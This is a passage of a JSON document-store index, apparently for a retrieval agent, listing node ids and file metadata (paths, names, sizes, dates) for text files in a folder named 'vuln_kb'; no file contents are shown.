"D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.txt", "file_name": "20250408_175733_437848.txt", "file_type": "text/plain", "file_size": 898, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "738715f8-1aff-4a43-b245-007bb56d0338": {"node_ids": ["2ee1224f-c309-40de-8464-3bb4e5749008"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.txt", "file_name": "20250408_175733_469365.txt", "file_type": "text/plain", "file_size": 2937, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "cfd969b8-282d-4345-bb68-4aba75a850c9": {"node_ids": ["38ee6eee-c9e0-4c90-af95-0cff38953c59"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.txt", "file_name": "20250408_175735_566691.txt", "file_type": "text/plain", "file_size": 957, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "43860f7f-ccb0-4ab3-b118-69cbf9b32609": {"node_ids": ["f9ed3535-0133-4181-8cf8-81bd3cef9560"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.txt", "file_name": "20250408_175735_606831.txt", "file_type": "text/plain", "file_size": 973, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "d8c9c662-c563-49af-b3c8-51c6634d6511": {"node_ids": ["8ddabb70-72bb-4ec5-a93d-c61b82700dce"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.txt", "file_name": "20250408_175735_647466.txt", "file_type": "text/plain", "file_size": 1028, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}}, "c6d23c29-e657-484b-bda8-84403ab08c41": {"node_ids": ["49fdf6c2-cc37-4b53-9c6b-845c391e7d8f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_804230.clean.txt", "file_name": "20250408_175658_804230.clean.txt", "file_type": "text/plain", "file_size": 1221, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "383f4465-4635-495a-a0de-0baae9da88d6": {"node_ids": ["ff1784ea-6f4a-40c9-bc03-a16649772374"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_128222.clean.txt", "file_name": "20250408_175638_128222.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "59ad1153-8337-49e3-a310-6d6e330319a1": {"node_ids": ["2cc8fd32-b84e-45ac-aeb0-de51bd92bf8f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.clean.txt", "file_name": "20250408_175721_942258.clean.txt", "file_type": "text/plain", "file_size": 1821, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "7653e2e3-0b9a-44e4-8746-2ab3e1b06dc1": {"node_ids": ["0fc761f6-63f4-4d7f-859f-26f86f7af9f8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_191146.clean.txt", "file_name": "20250408_175731_191146.clean.txt", "file_type": "text/plain", "file_size": 977, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "58935546-cbf0-4623-a56b-f32f4682a619": {"node_ids": ["97c17499-ff91-4b46-a5c8-6663c5a798c2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_827011.clean.txt", "file_name": "20250408_175728_827011.clean.txt", "file_type": "text/plain", "file_size": 628, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "bc0b990d-eb84-4a42-aea2-33bddd891e07": {"node_ids": ["2996d677-d0fc-4724-85af-f68b10360900"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_102846.clean.txt", "file_name": "20250408_175708_102846.clean.txt", "file_type": "text/plain", "file_size": 2138, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "fabe0746-c7b5-4ad0-9524-01e25d290b44": {"node_ids": ["c195a811-b220-4fd4-ab3e-f9a755a1e15b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.clean.txt", "file_name": "20250408_175724_195500.clean.txt", "file_type": "text/plain", "file_size": 1363, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f3663b85-5137-4845-bbe4-90a3e9dc0763": {"node_ids": ["da2f1661-a764-4415-a56e-e5db904d4bf9", "1ca6ec9c-711c-4505-aac1-7636f2ade225"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.clean.txt", "file_name": "20250408_172348_641657.clean.txt", "file_type": "text/plain", "file_size": 4376, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f3ca6dc3-cce7-4adb-8203-eecc5a27fed3": {"node_ids": ["2dffab20-ff3a-46d7-94d1-57126b28fef6", "13c72b01-50e9-433b-a555-c6e0772fc3f5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_554567.clean.txt", "file_name": "20250408_175656_554567.clean.txt", "file_type": "text/plain", "file_size": 4879, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "85fb8769-c8f9-48d3-9bc9-e329fcd1e4bd": {"node_ids": ["7d218378-32e1-4938-ab0f-a8a16f90573e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_999098.clean.txt", "file_name": "20250408_175714_999098.clean.txt", "file_type": "text/plain", "file_size": 1938, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "1710b53c-fee7-445f-a938-f42b41ae985e": {"node_ids": ["fd82a32f-a572-4634-9dce-509f67d2344e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_828683.clean.txt", "file_name": "20250408_175705_828683.clean.txt", "file_type": "text/plain", "file_size": 1961, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0c76be20-2cad-4010-a0be-87089d1f295f": {"node_ids": ["fb074159-8e79-414b-b3a2-c5e517d96c3a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.clean.txt", "file_name": "20250408_175726_492824.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "d1a443ae-1964-49cc-9c2e-bbdc19ae7674": {"node_ids": ["d029ffa9-2011-4759-8cb7-9f05ee95098e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_359392.clean.txt", "file_name": "20250408_175733_359392.clean.txt", "file_type": "text/plain", "file_size": 1814, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "cee41a7e-ed32-4e0a-b3ba-d51a45b42577": {"node_ids": ["2ab3bb79-4ffe-4496-bc54-edcf78923d89"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.clean.txt", "file_name": "20250408_175701_229442.clean.txt", "file_type": "text/plain", "file_size": 1110, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "11d44e7e-c872-4b75-847a-53bbb232e3c0": {"node_ids": ["2775cf72-6f12-4971-bd82-ff3f7742bbbe"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.clean.txt", "file_name": "20250408_175658_930540.clean.txt", "file_type": "text/plain", "file_size": 1197, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "7eb48ff8-fc96-4043-b629-e7692b0ef427": {"node_ids": ["70c1efad-c045-42ba-8b1f-550d9fdda64d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.clean.txt", "file_name": "20250408_172348_778327.clean.txt", "file_type": "text/plain", "file_size": 3269, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "d9900fad-91ef-4225-b339-eab21059d4b7": {"node_ids": ["ad4c72b7-2ebd-4f1c-9d70-c071f2bddd2c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.clean.txt", "file_name": "20250408_175714_904801.clean.txt", "file_type": "text/plain", "file_size": 934, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "76048ca3-92f8-4467-9cc8-5df21242e3c2": {"node_ids": ["3d06cea1-7e66-4ad8-b9e9-dea0d8fb1e50"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.clean.txt", "file_name": "20250408_175715_061981.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "62a16f55-2553-437b-85aa-a341bc986a99": {"node_ids": ["e5c829c8-f5ac-40c6-bbf6-6a40533489e2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.clean.txt", "file_name": "20250408_175726_461077.clean.txt", "file_type": "text/plain", "file_size": 2256, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "00bbf150-9305-49f1-b36e-64186748816b": {"node_ids": ["3804a784-2d80-4590-967a-dcafd2659e54"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.clean.txt", "file_name": "20250408_175654_243902.clean.txt", "file_type": "text/plain", "file_size": 1957, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2c01cb90-1a15-42f6-9e9d-790a09bf2efd": {"node_ids": ["3520f406-ec18-4092-a38b-660300fe5204"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.clean.txt", "file_name": "20250408_172349_002274.clean.txt", "file_type": "text/plain", "file_size": 1969, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "8ac7b98e-5bd2-460f-8bbf-0697b076c4b6": {"node_ids": ["ec1a6771-1fa7-4618-9e90-87e07f91547d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.clean.txt", "file_name": "20250408_172348_937161.clean.txt", "file_type": "text/plain", "file_size": 2681, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "966e7775-20e7-4aa8-9396-ea55ce450fe5": {"node_ids": ["8efa278c-b98c-4e1a-8c6d-e881ccdc0898"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.clean.txt", "file_name": "20250408_175712_648702.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "cf35c627-405b-4dbb-b7d4-be24d068b174": {"node_ids": ["e2f36a02-915e-40e3-9f20-8e9bf536624c", "b7cee880-6dd0-4db0-84ab-031920f0eaa1"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2adfc389-1945-44d4-a04f-20678d22df81": {"node_ids": ["f1ef5ea8-1e32-46b3-b17a-978edc5a34bc"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.clean.txt", "file_name": "20250408_175640_499643.clean.txt", "file_type": "text/plain", "file_size": 408, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "1548c67f-2509-40d8-b9ab-3d72418fb55e": {"node_ids": ["9a7b8504-d07f-404a-b406-d6f649ada750"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.clean.txt", "file_name": "20250408_175721_910820.clean.txt", "file_type": "text/plain", "file_size": 562, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "79c4ed0e-e7dd-4872-97ee-3ae2bf617cb4": {"node_ids": ["b89fcaa2-bada-4b59-a662-4246916208d5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.clean.txt", "file_name": "20250408_175715_030528.clean.txt", "file_type": "text/plain", "file_size": 1633, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2ac987c9-e972-40e7-aa29-ee667ce146bf": {"node_ids": ["ce888102-0ec1-41fc-98c1-9e929d6d9ff7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.clean.txt", "file_name": "20250408_175731_111570.clean.txt", "file_type": "text/plain", "file_size": 1415, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "685a381b-0f52-48ff-8716-b33acc4cf1aa": {"node_ids": ["ad0cd368-1d2b-4c45-9b68-8d2bba6f3e3a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.clean.txt", "file_name": "20250408_175705_907322.clean.txt", "file_type": "text/plain", "file_size": 2507, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c1066eff-6d15-4f4b-a060-2454c7cd599f": {"node_ids": ["50bb1c6e-bd2e-49cd-bb81-d1135c6e6680"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.clean.txt", "file_name": "20250408_175703_419142.clean.txt", "file_type": "text/plain", "file_size": 1342, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "32a2abc1-b78d-4e66-a904-4842acb5707f": {"node_ids": ["ab30ee0c-b392-467c-bd16-e3912f29e3e2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.clean.txt", "file_name": "20250408_175719_689337.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "aa4bda74-e719-4b41-a232-c6a13b73a470": {"node_ids": ["6ea0b4dd-1099-4dba-a6e6-3ed1894f5dfe"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.clean.txt", "file_name": "20250408_175733_437848.clean.txt", "file_type": "text/plain", "file_size": 473, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "1427eb19-d3c4-49ae-a02a-c3126732870f": {"node_ids": ["36d9ac75-0d33-40e9-a14c-c9b2fc4fc7e4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.clean.txt", "file_name": "20250408_175708_071438.clean.txt", "file_type": "text/plain", "file_size": 1738, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "22e6772f-0557-485d-81fd-3eb4bec7df24": {"node_ids": ["e6ba7f7f-b657-4c86-a974-501326c88177"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.clean.txt", "file_name": "20250408_175722_020976.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "55230178-4002-4de5-8e3d-da2937f692ae": {"node_ids": ["46badc81-4deb-4923-a91f-02928581c3fd"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.clean.txt", "file_name": "20250408_175731_011003.clean.txt", "file_type": "text/plain", "file_size": 997, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "4f366716-47f7-4bce-a027-ba9826fb5e15": {"node_ids": ["abf1b763-aeff-47f9-956e-c04fc9fc3b81"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.clean.txt", "file_name": "20250408_175638_222631.clean.txt", "file_type": "text/plain", "file_size": 643, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "788b1741-5713-4b00-b067-2c3b7fa7509b": {"node_ids": ["a00e9a92-aad8-491a-a446-793fe8a63a93"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.clean.txt", "file_name": "20250408_175645_048674.clean.txt", "file_type": "text/plain", "file_size": 1371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f19845dc-1c38-40f7-a9f5-22076d941232": {"node_ids": ["61798928-d7e4-425b-9f74-91f21ae97ab6"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.clean.txt", "file_name": "20250408_175654_307170.clean.txt", "file_type": "text/plain", "file_size": 2003, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "cc7da19d-5515-493a-80d9-56d1e268bf9b": {"node_ids": ["8292560e-95e7-457d-9f39-ba54e24af9be"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.clean.txt", "file_name": "20250408_175717_249721.clean.txt", "file_type": "text/plain", "file_size": 1874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "77785a5c-ac2f-4bd7-b57d-280bdd1bcb85": {"node_ids": ["d873be0e-e9bc-4dfb-bed1-6afc0d680a98"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.clean.txt", "file_name": "20250408_175710_404463.clean.txt", "file_type": "text/plain", "file_size": 1264, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b949fcd3-d214-4441-b771-7006ed718920": {"node_ids": ["4b3428e3-0d60-4cdf-844a-a1872253dd78"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.clean.txt", "file_name": "20250408_175712_727301.clean.txt", "file_type": "text/plain", "file_size": 2337, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "22f957bd-a26c-48b8-84be-4b9aab652512": {"node_ids": ["9822fca6-ba2f-4503-b4b4-aac72947e041"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.clean.txt", "file_name": "20250408_175642_660731.clean.txt", "file_type": "text/plain", "file_size": 3071, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0d027fb3-dddd-49d2-a881-3531e12cc8fa": {"node_ids": ["d351b19e-7c84-418d-93b1-8c52113b00f6", "571b87d3-1327-4fd2-900a-f57f74803b7c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": "20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "eb5589dd-06bc-4f44-bcb0-ce6dcf7208f0": {"node_ids": ["4b075f27-9f83-4e90-9fcf-3e3e44a78c02"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_582730.clean.txt", "file_name": "20250408_175649_582730.clean.txt", "file_type": "text/plain", "file_size": 913, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "5c464e1e-806d-4ed5-ab14-9e16cffc013c": {"node_ids": ["cff0fd30-21c0-404d-8f6e-de7aaed22018"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_376030.clean.txt", "file_name": "20250408_175717_376030.clean.txt", "file_type": "text/plain", "file_size": 1662, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2396d5cb-1cff-475b-875d-7303607f2216": {"node_ids": ["10cce85a-ea7c-403e-9279-e8e77ba7d62c", "4a23a0d7-51b4-452e-9823-28846bd05566", "fc9f9e2f-b318-4eac-a723-4074e5122716", "8baa4512-191f-4d12-9983-c368384a6dc4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.clean.txt", "file_name": "20250408_175701_150694.clean.txt", "file_type": "text/plain", "file_size": 13302, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "d0312b7a-cb5a-48ac-b6d9-5a6f41567582": {"node_ids": ["94cf70f2-1867-4b85-afb9-f3a027c13f68"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.clean.txt", "file_name": "20250408_175710_372239.clean.txt", "file_type": "text/plain", "file_size": 718, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "7b74d5e1-2d02-41bb-aff0-08fb84f18a61": {"node_ids": ["adf9acaa-bde0-4fbf-afcd-91ff1f741fc3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.clean.txt", "file_name": "20250408_175724_289844.clean.txt", "file_type": "text/plain", "file_size": 634, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0137a2cc-9011-4a3f-b5ea-eb440d83efeb": {"node_ids": ["e6c2657e-cf38-4d41-811b-2036cd108d93"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_327774.clean.txt", "file_name": "20250408_175733_327774.clean.txt", "file_type": "text/plain", "file_size": 1158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0a6859b0-3a8f-41bf-936f-bf7c59d329a2": {"node_ids": ["aee514f5-4b76-4bd6-b654-e1aaa621d745"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_385791.clean.txt", "file_name": "20250408_175654_385791.clean.txt", "file_type": "text/plain", "file_size": 2786, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "9d6943d2-b427-4b63-934c-6458263db087": {"node_ids": ["36d02be3-e2f2-4e12-8474-dc236b940f6a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_832305.clean.txt", "file_name": "20250408_175721_832305.clean.txt", "file_type": "text/plain", "file_size": 1331, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "8a669b95-3494-41d6-b8bb-b35d05e1bd23": {"node_ids": ["77208e08-4dec-4d87-8ead-d2c7ecef08b1", "ae48282f-d5dd-4493-9bf6-ba62be0734f4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_400945.clean.txt", "file_name": "20250408_175647_400945.clean.txt", "file_type": "text/plain", "file_size": 4783, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f4b56dbb-3650-47a2-b3d0-7557ca9c593e": {"node_ids": ["b83685bf-a560-4c21-b1e4-e1353a2e47c3"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.clean.txt", "file_name": "20250408_175649_772253.clean.txt", "file_type": "text/plain", "file_size": 930, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "a2bd4517-2dec-4d35-8ca5-389597f4d3b9": {"node_ids": ["2c06c253-8c5c-47ab-af07-89ec5f04d5ff"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.clean.txt", "file_name": "20250408_175649_661763.clean.txt", "file_type": "text/plain", "file_size": 1198, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "dc87aed5-d67a-4fef-b73d-f2c0f533f5bc": {"node_ids": ["c90e676b-639e-4eaf-9acc-7e2f4f7d657d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.clean.txt", "file_name": "20250408_175651_934235.clean.txt", "file_type": "text/plain", "file_size": 2696, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "862d9f24-b20a-42bd-862c-4620d7b657e1": {"node_ids": ["17841a25-326f-4baf-ae69-528c9bd6b8d5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_277048.clean.txt", "file_name": "20250408_175654_277048.clean.txt", "file_type": "text/plain", "file_size": 2642, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "3927bc7d-87d4-4023-a0c7-39c2f6879269": {"node_ids": ["cceb856d-bce1-4fc5-8dee-c4e5a31700a9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_094133.clean.txt", "file_name": "20250408_175652_094133.clean.txt", "file_type": "text/plain", "file_size": 684, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "de4c336d-9b37-40b4-af34-1c08a233d1d1": {"node_ids": ["9129da86-42ae-4ae0-ada0-bf39575bef63"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_755233.clean.txt", "file_name": "20250408_175642_755233.clean.txt", "file_type": "text/plain", "file_size": 1046, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "21b4d607-1331-4c4a-a6c8-60eb19a0f1d9": {"node_ids": ["05f5807d-ff00-484b-b925-cece49344685"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175644_985957.clean.txt", "file_name": "20250408_175644_985957.clean.txt", "file_type": "text/plain", "file_size": 558, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2712ca84-2eb2-4adf-8f38-f57461b60dfb": {"node_ids": ["ea5517a3-2839-4053-a1b2-cce94dc175cc"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_469365.clean.txt", "file_name": "20250408_175733_469365.clean.txt", "file_type": "text/plain", "file_size": 2615, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f5c54eea-a0eb-44bc-8b52-48d3e9f00a1b": {"node_ids": ["a87ebdfc-3bfb-425c-a34a-d7c27039c591", "d6cf4491-403f-4869-bce1-beb2987b098d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.clean.txt", "file_name": "20250408_175710_483335.clean.txt", "file_type": "text/plain", "file_size": 4419, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "35af454d-9818-4eb3-8905-54007222c87c": {"node_ids": ["814b0675-be6e-49b3-a9eb-3f211272f2f6", "c4e46788-f358-428b-88a6-821e43f5a3d9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.clean.txt", "file_name": "20250408_175649_693170.clean.txt", "file_type": "text/plain", "file_size": 4272, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "5086b18d-1583-4ce3-a7fe-c5046582df5f": {"node_ids": ["93923ab7-93bc-4809-b0e4-034a53c34e81"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_617451.clean.txt", "file_name": "20250408_175712_617451.clean.txt", "file_type": "text/plain", "file_size": 3931, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b0d97fa8-9fb1-4362-9329-f8fc3633a0dd": {"node_ids": ["3375fd3c-c6b3-49ce-9b8f-f00ff8275388"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_806225.clean.txt", "file_name": "20250408_175712_806225.clean.txt", "file_type": "text/plain", "file_size": 2371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "dd3dbb0c-1adc-48d9-9831-5eb2dee8390c": {"node_ids": ["6981a4c4-e8d6-463f-a07c-821795cd5f36"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_297762.clean.txt", "file_name": "20250408_175717_297762.clean.txt", "file_type": "text/plain", "file_size": 1051, "creation_date": "2025-04-22", 